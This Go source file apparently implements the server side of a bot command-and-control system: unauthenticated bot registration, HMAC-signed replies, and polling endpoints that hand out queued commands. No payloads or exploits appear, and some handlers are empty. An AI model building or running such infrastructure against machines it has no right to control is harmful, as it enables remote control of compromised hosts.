package main

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"crypto/hmac"
	"database/sql"
	"encoding/json"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/chi/v5"
)

func task_cleaner(db *sql.DB, interval time.Duration) {
	go func() {
		time.Sleep(time.Duration(interval) * time.Second)
		_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
		if err != nil {
			log.Println("Task cleanup error: " + err.Error())
		}
	}()
}

func http_sender(w http.ResponseWriter, guid, token string, reply *common.ServerReply) error {
	server_time := utils.GenerateUtcTimestampString()

	// Setup http reply's header
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Guid", guid)
	w.Header().Set("X-Time", server_time)
	bytToken, _ := common.Base64Dec(token)
	hmac := common.HmacSha256(bytToken, []byte(guid+server_time))
	w.Header().Set("X-Sign", common.Base64Enc(hmac))
	// Setup http reply's body
	body, _ := json.Marshal(reply)
	// Send http reply
	_, err := w.Write(body)

	return err
}

func recovery_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("recovery_handler triggered")

	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")

	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Status = 1
	reply.TaskId = 0
	reply.Error = ""
	reply.Cmd = ""

	out_guid := ""
	out_token := ""
	strSql := "select guid, token from clients where guid=?"
	err := db1.QueryRow(common.Db, strSql, guid).Scan(&out_guid, &out_token)
	if err == sql.ErrNoRows {
		// No such bot, create bot
		strSql = "insert into clients (guid, token, lastseen) values(?,?,?)"
		// Generate new token
		out_token = common.Base64Enc(utils.GenerateRandomBytes(32))
		_, err = db1.Insert(common.Db, strSql, guid, out_token, time1)
		if err != nil {
			// Failed to create a bot
			reply.Status = 0
			reply.Error = "No such bot and failed to create new bot"
		} else {
			// Create bot okay
			reply.Args["Token"] = out_token
		}
	} else if err != nil {
		reply.Status = 0
		reply.Error = "Unknown error"
		log.Println(err.Error())
	} else {
		// Find the bot
		reply.Args["Token"] = out_token
		// Update timestamp lastseen
		strSql = "update clients set lastseen=? where guid=?"
		_, err = db1.Exec(common.Db, strSql, time1, out_guid)
		if err != nil {
			reply.Status = 0
			reply.Error = "Find the bot but failed to update"
			log.Println(err.Error())
		}
	}

	err = http_sender(w, guid, out_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func check_package_legality(guid string, token string, lastseen string,
	x_time string, x_sign string) bool {
	// Overtime
	time1_bot, _ := strconv.ParseInt(x_time, 10, 64)
	saved_lastseen_server, _ := strconv.ParseInt(lastseen, 10, 64)
	if time1_bot-saved_lastseen_server >= 60*1000 {
		return false
	}
	// Check sign
	bytesToken, _ := common.Base64Dec(token)
	sign := common.HmacSha256(bytesToken, []byte(guid+x_time))
	bytesSign, _ := common.Base64Dec(x_sign)

	return hmac.Equal(sign, bytesSign)
}

func poll_handler(w http.ResponseWriter, r *http.Request) {
	log.Println("poll_handler triggered")
	guid := r.Header.Get("X-Guid")
	time1 := r.Header.Get("X-Time")
	sign := r.Header.Get("X-Sign")

	// Find bot in clients
	var saved_guid string
	var saved_token string
	var saved_lastseen string
	reply := common.ServerReply{
		Args: make(map[string]any),
	}

	reply.Cmd = ""
	reply.Error = ""
	reply.Status = 1
	reply.TaskId = 0

	sqlStr := "select guid, token, lastseen from clients where guid=?"
	err := db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_guid, &saved_token, &saved_lastseen)
	if err == sql.ErrNoRows {
		// Can't find bot
		log.Println("can't find bot in poll handler" + err.Error())
		reply.Cmd = "register"
		reply.Status = 0
		reply.Error = "can't find bot in poll handler"
	} else if err != nil {
		log.Println(err.Error())
		reply.Status = 0
		reply.Error = "Unknown error"
		reply.Cmd = "register"
	} else {
		// Find it!
		if !check_package_legality(guid, saved_token, saved_lastseen, time1, sign) {
			reply.Status = 0
			reply.Error = "Illegal package"
			reply.Cmd = "poll"
		} else {
			sqlStr = "select t.id as task_id, c.command, c.args" +
				" from tasks t join commands c on t.command_id = c.id" +
				" where t.guid = ? and t.status = 'queued' order by t.created_at asc limit 1"
			saved_id := 0
			saved_command := ""
			saved_args := ""
			err = db1.QueryRow(common.Db, sqlStr, guid).Scan(&saved_id, &saved_command, &saved_args)
			if err == sql.ErrNoRows {
				// No such task
				reply.Cmd = "poll"
				reply.Status = 0
				reply.Error = "can't find task"
			} else if err != nil {
				// Error in finding task
				reply.Status = 0
				reply.Error = "Unknown error"
				reply.Cmd = "register"
			} else {
				// Find the command of task
				reply.Cmd = saved_command
				json.Unmarshal([]byte(saved_args), &reply.Args)
			}
		}
	}

	err = http_sender(w, guid, saved_token, &reply)
	if err != nil {
		log.Println(err.Error())
	}
}

func logout_handler(w http.ResponseWriter, r *http.Request) {

}

func login_handler(w http.ResponseWriter, r *http.Request) {

}

func Server() {
	router := chi.NewRouter()

	router.Use(middleware.Logger)
	router.Use(middleware.Recoverer)

	router.Post("/recovery", recovery_handler)
	router.Post("/poll", poll_handler)
	router.Post("/login", login_handler)
	router.Post("/logout", logout_handler)

	strPort := strconv.Itoa(common.Cfg.Server.Port)
	log.Println("[+] Server running on " + common.Cfg.Server.Host + ":" + strPort)

	http.ListenAndServe(":"+strPort, router)
}
